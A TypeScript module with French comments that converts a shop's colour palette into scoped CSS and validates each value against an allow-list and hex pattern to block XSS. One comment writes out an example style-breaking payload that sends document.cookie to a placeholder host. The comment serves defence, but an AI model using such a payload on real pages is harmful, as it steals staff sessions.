/**
 * LA PALETTE D'UNE ENSEIGNE, TRADUITE EN CSS.
 *
 * Pur, sans accès base et sans DOM: utilisable au rendu serveur comme côté client.
 *
 * ⚠ TROIS RÔLES DE COULEUR PAR RAYON, ET ILS NE SONT PAS INTERCHANGEABLES. C'est la distinction que
 * la maquette a mis plusieurs allers-retours à faire tenir, dont un signalement direct du
 * propriétaire ("a lot of black on black text. or white on white"):
 *   `--kN`    le REMPLISSAGE: la pastille, la barre, l'aplat.
 *   `--kNt`   la même teinte en TEXTE sur le fond du panneau. Une couleur lisible en aplat est
 *             presque toujours illisible en lettres sur ce même fond.
 *   `--onkN`  l'encre POSÉE SUR l'aplat `--kN`. Calculée, jamais choisie.
 *
 * ⚠ `--onkN` EST CALCULÉ ICI, AU RENDU, et pas lu dans le navigateur. La maquette le déduisait avec
 * `getComputedStyle` sur l'élément racine, ce qui obligeait à attendre que le navigateur ait composé
 * la page - et donne une valeur périmée dès qu'une classe change. Comme la palette est désormais une
 * DONNÉE et non une feuille de style, la luminance se calcule au moment où on la sert. Le calcul est
 * exact pour les deux thèmes parce qu'on le fait deux fois, sur les deux jeux de valeurs.
 */
import type { Palette, ThemedPalette } from "./templates";

/** Luminance relative WCAG. Accepte `#rgb`, `#rrggbb` et `rgb()/rgba()`. */
export function relLum(css: string): number {
  let r = 0;
  let g = 0;
  let b = 0;
  const m = css.match(/rgba?\(([^)]+)\)/);
  if (m) {
    const q = m[1]!.split(",").map(Number);
    [r, g, b] = [q[0] ?? 0, q[1] ?? 0, q[2] ?? 0];
  } else {
    let h = css.trim().replace("#", "");
    if (h.length === 3) h = h.split("").map((c) => c + c).join("");
    if (h.length < 6) return 0;
    r = parseInt(h.slice(0, 2), 16);
    g = parseInt(h.slice(2, 4), 16);
    b = parseInt(h.slice(4, 6), 16);
  }
  const f = (v: number) => {
    const x = v / 255;
    return x <= 0.03928 ? x / 12.92 : ((x + 0.055) / 1.055) ** 2.4;
  };
  return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b);
}

/**
 * Encre foncée sur un aplat clair, blanche sur un aplat foncé.
 *
 * Le seuil 0.22 est celui où les deux options se croisent en contraste. Le calculer plutôt que le
 * choisir supprime toute une CLASSE de faute: aucune couleur ajoutée plus tard, par nous ou par un
 * patron depuis les Réglages, ne peut produire du blanc sur blanc.
 */
const INK_ON_LIGHT = "#1c1508";
export function inkOn(fill: string): string {
  return relLum(fill) > 0.22 ? INK_ON_LIGHT : "#ffffff";
}

/**
 * LES SEULES VARIABLES QU'UNE PALETTE PEUT DÉFINIR, et le seul format de valeur accepté.
 *
 * ⚠⚠ CECI EST UNE BARRIÈRE XSS, pas une validation de confort. La palette est écrite par le PATRON
 * depuis les Réglages, puis servie dans un `<style dangerouslySetInnerHTML>` par la coquille du
 * commerce. Une valeur libre y refermerait l'élément et exécuterait du script:
 *
 *     "plate": "red}</style><script>fetch('//x/?c='+document.cookie)</script>"
 *
 * La victime n'est pas le patron: c'est CHAQUE EMPLOYÉ qui ouvre la page, et le script s'exécute sur
 * l'ORIGINE DE CITADEL, la même que /staff et /cad. Un patron de bar y gagnerait du JavaScript
 * arbitraire dans le navigateur d'un Fondateur le jour où celui-ci consulte le commerce.
 *
 * ⚠ La CSP ne rattraperait rien ici: /business n'en reçoit aucune aujourd'hui, et celle de /staff
 * autorise `'unsafe-inline'`. La seule défense est de ne jamais écrire une valeur non prouvée.
 *
 * ⚠ Filtré ICI et pas seulement à l'écriture, délibérément: `updateIdentity` n'est qu'un écrivain
 * parmi d'autres possibles (un script, une migration, une ligne éditée à la main), alors que ce
 * point est le SEUL par lequel une palette devient du CSS. Valider à l'écriture seule est la version
 * de ce correctif qu'un futur écrivain contourne sans le savoir. Même raisonnement que l'encre
 * calculée juste au-dessus: on supprime la CLASSE de faute, pas l'instance.
 */
const PALETTE_KEYS: ReadonlySet<string> = new Set([
  "brand", "brand-text",
  "k1", "k2", "k3", "k4",
  "k1t", "k2t", "k3t", "k4t",
  "bg", "surf", "plate",
]);

/** `#rgb`, `#rrggbb`, `#rrggbbaa`. Rien d'autre: ni `rgb()`, ni un nom, ni une variable. */
const HEX = /^#(?:[0-9a-f]{3}|[0-9a-f]{6}|[0-9a-f]{8})$/i;

export function isSafePaletteEntry(key: string, value: unknown): value is string {
  return PALETTE_KEYS.has(key) && typeof value === "string" && HEX.test(value.trim());
}

/**
 * LE PONT VERS LES JETONS SEMANTIQUES DE shadcn/ui.
 *
 * `globals.css` definit UN theme shadcn pour toute l'application (le "vin" de CITADEL: --primary
 * #bf4a5e, --chart-1..5, etc.), consomme par `@/components/ui/*`. Un composant shadcn utilise SOUS
 * `[data-biz="slug"]` doit heriter l'IDENTITE DE L'ENSEIGNE, pas la teinte du staff: un Button ou une
 * Card shadcn dans le portail vigneron doit etre bordeaux, pas "vin CITADEL" par coincidence de
 * palette. Ce bloc ne redefinit rien depuis rien: il fait POINTER les jetons shadcn vers les
 * variables de la palette DEJA emises juste au-dessus, dans la MEME regle CSS - jamais un hex
 * recopie, pour que retoucher un `--kN` ici retouche le composant shadcn qui le consomme sans un
 * second endroit a synchroniser.
 *
 * ⚠ `--chart-1..4` suivent les quatre tons de rayon (`--k1..k4`): un graphique shadcn (Recharts)
 * herite donc la meme palette que les puces de categorie de la caisse, sans jeu de couleurs distinct
 * a inventer par page. `--chart-5` retombe sur un neutre du portail (`--faint`): le modele de
 * donnees n'a que quatre tons, un cinquieme categorique n'existe nulle part a lire.
 *
 * ⚠ `--destructive` NE SUIT PAS la palette de l'enseigne, deliberement: une erreur doit rester
 * rouge partout, quelle que soit l'entreprise, sinon un patron dont le rouge EST la couleur de
 * marque (la supérette) verrait ses propres accents se lire comme des alertes.
 */
function shadcnBridge(): string {
  return [
    "--background:var(--bg)",
    "--foreground:var(--fg)",
    "--card:var(--surf)",
    "--card-foreground:var(--fg)",
    "--popover:var(--surf)",
    "--popover-foreground:var(--fg)",
    "--primary:var(--brand)",
    "--primary-foreground:var(--onbrand)",
    "--secondary:var(--k2)",
    "--secondary-foreground:var(--onk2)",
    // color-mix et non une couleur choisie: la meme technique que .chip[aria-pressed] de la
    // caisse (--sel-mix), pour que "en survol/selectionne" se lise comme une teinte DE l'enseigne
    // et non comme une surface generique posee par-dessus.
    "--accent:color-mix(in srgb, var(--primary) var(--sel-mix, 22%), var(--card))",
    "--accent-foreground:var(--fg)",
    "--muted:color-mix(in srgb, var(--card) 70%, black)",
    "--muted-foreground:var(--muted-fg, var(--faint))",
    "--destructive:var(--bad)",
    "--border:var(--line)",
    "--input:var(--line)",
    "--ring:var(--brand-text)",
    "--chart-1:var(--k1)",
    "--chart-2:var(--k2)",
    "--chart-3:var(--k3)",
    "--chart-4:var(--k4)",
    "--chart-5:var(--faint)",
    "--radius:var(--r)",
  ].join(";");
}

/**
 * Les déclarations CSS d'un thème: la palette VALIDÉE, les encres calculées, et le pont shadcn.
 *
 * Une entrée non conforme est écartée EN SILENCE plutôt que de faire échouer le rendu, exactement
 * comme `setGrants` écarte une capacité inconnue: une donnée douteuse ne doit pas pouvoir mettre le
 * portail par terre pour tout le monde. La variable absente retombe alors sur celle de `:root`.
 */
function declarations(p: Palette): string {
  const out: string[] = [];
  for (const [k, v] of Object.entries(p ?? {})) {
    if (isSafePaletteEntry(k, v)) out.push(`--${k}:${v.trim()}`);
  }
  for (let i = 1; i <= 4; i++) {
    const fill = p?.[`k${i}`];
    // `inkOn` produit une de deux constantes littérales, donc rien d'externe n'entre ici.
    if (typeof fill === "string" && HEX.test(fill.trim())) out.push(`--onk${i}:${inkOn(fill.trim())}`);
  }
  const brand = p?.brand;
  if (typeof brand === "string" && HEX.test(brand.trim())) {
    out.push(`--onbrand:${inkOn(brand.trim())}`);
  }
  out.push(shadcnBridge());
  return out.join(";");
}

/**
 * La feuille de style d'une enseigne, portée par son `data-biz`.
 *
 * Un bloc `<style>` plutôt qu'un `style={{}}` en ligne, parce qu'un attribut en ligne ne peut pas
 * porter de media query et que le thème clair en a besoin. Les deux sélecteurs de thème clair sont
 * là pour la même raison que dans le reste de CITADEL: `prefers-color-scheme` suit le système, et
 * `:root[data-theme]` doit pouvoir le contredire quand l'utilisateur bascule à la main.
 *
 * ⚠ `slug` arrive de l'URL et entre dans un sélecteur CSS: on le réduit à `[a-z0-9-]` avant de le
 * concaténer. Sans ça, un slug forgé refermerait le sélecteur et injecterait des règles arbitraires
 * dans la page - un XSS de style, silencieux et parfaitement valide pour le navigateur.
 */
export function paletteStyle(slug: string, palette: ThemedPalette): string {
  const safe = slug.replace(/[^a-z0-9-]/gi, "");
  const sel = `[data-biz="${safe}"]`;
  const dark = declarations(palette.dark ?? {});
  const light = declarations(palette.light ?? palette.dark ?? {});
  return [
    `${sel}{${dark}}`,
    `@media (prefers-color-scheme: light){${sel}{${light}}}`,
    `:root[data-theme="light"] ${sel}{${light}}`,
    `:root[data-theme="dark"] ${sel}{${dark}}`,
  ].join("");
}

/** Les trois variables d'un rayon, prêtes pour un `style` en ligne. `tone` vaut 1 à 4. */
export function toneVars(tone: number): Record<string, string> {
  const n = ((Math.trunc(tone) - 1) % 4 + 4) % 4 + 1; // borne 1..4 même sur une valeur aberrante
  return { "--k": `var(--k${n})`, "--kt": `var(--k${n}t)`, "--onk": `var(--onk${n})` };
}

/**
 * Un montant, en dollars, depuis des CENTIMES.
 *
 * ⚠ `fr-FR` et non `fr-CA`: la maquette a été validée avec l'espace insécable comme séparateur de
 * milliers, et le dollar POSÉ APRÈS le nombre. Changer de locale décalerait chaque prix de la grille.
 */
export function money(cents: number): string {
  return `${Math.round(cents / 100).toLocaleString("fr-FR")} $`;
}

/** Le même montant pour la grille produits, où le `$` est en exposant. */
export function priceParts(cents: number): { amount: string; symbol: string } {
  return { amount: Math.round(cents / 100).toLocaleString("fr-FR"), symbol: "$" };
}

/**
 * Les initiales d'un nom, pour le repli d'un `AvatarFallback` shadcn.
 *
 * Deux lettres au plus (prénom, nom), jamais plus: un avatar est une pastille, pas une étiquette.
 * Un nom d'un seul mot (pseudo, nom de compte) retombe sur sa seule initiale plutôt que de laisser
 * la pastille vide, ce qu'aucun `AvatarFallback` de ce portail ne doit jamais être.
 */
export function initials(name: string): string {
  const parts = name.trim().split(/\s+/).filter(Boolean);
  if (parts.length === 0) return "?";
  if (parts.length === 1) return parts[0]!.slice(0, 2).toUpperCase();
  return `${parts[0]!.charAt(0)}${parts[parts.length - 1]!.charAt(0)}`.toUpperCase();
}
